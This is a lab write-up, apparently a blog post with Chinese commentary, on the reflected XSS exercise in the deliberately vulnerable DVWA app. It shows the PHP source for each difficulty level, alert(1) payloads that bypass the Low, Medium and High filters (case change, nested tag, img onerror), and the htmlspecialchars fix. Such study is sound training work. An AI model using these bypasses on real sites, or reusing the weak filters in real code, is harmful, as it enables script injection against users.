---
layout: post
title: "DVWA Reflected XSS"
description: ""
date: 2023-07-11
categories:
  - DVWA
  - DVWA_XSS
author: ""
tags: ['DVWA', 'XSS']
---



# DVWA Reflected XSS

###### tags: `DVWA`





Low:

code:
```php=
<?php

header ("X-XSS-Protection: 0");

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Feedback for end user
    echo '<pre>Hello ' . $_GET[ 'name' ] . '</pre>';
}

?> 

```


沒過濾。

payload:
```

<script>alert(1)</script>
```

<br/><br/>

# Medium

code:

```php=
<?php

header ("X-XSS-Protection: 0");

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Get input
    $name = str_replace( '<script>', '', $_GET[ 'name' ] );

    // Feedback for end user
    echo "<pre>Hello ${name}</pre>";
}

?> 
```

只要script tag 出現就轉空

繞過:
```


大寫繞過
<Script>alert(1)</script>




雙寫繞過。
<s<script>cript>alert(1)</script>


```

最好不要用字串過濾，繞過機率比較高，如果要也要用出現關鍵字一次，就失敗。



<br/><br/>

# High


code:
```php=
 <?php

header ("X-XSS-Protection: 0");

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Get input
    $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] );

    // Feedback for end user
    echo "<pre>Hello ${name}</pre>";
}

?>

```

這題就是這樣，只要出現script 字串就轉空。，他用regex 貪婪匹配，所以不只比對一次。


所以不能用 script tag

改用 img tag
```
<img src="123"  onerror="alert(1);" />
```

成功

<br/><br/>

# Impossible


htmlspecialchars 過濾掉蠻多特殊字元，所以基本上很難繞過。

code:
```php=
<?php

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    // Get input
    $name = htmlspecialchars( $_GET[ 'name' ] );

    // Feedback for end user
    echo "<pre>Hello ${name}</pre>";
}

// Generate Anti-CSRF token
generateSessionToken();

?> 

```














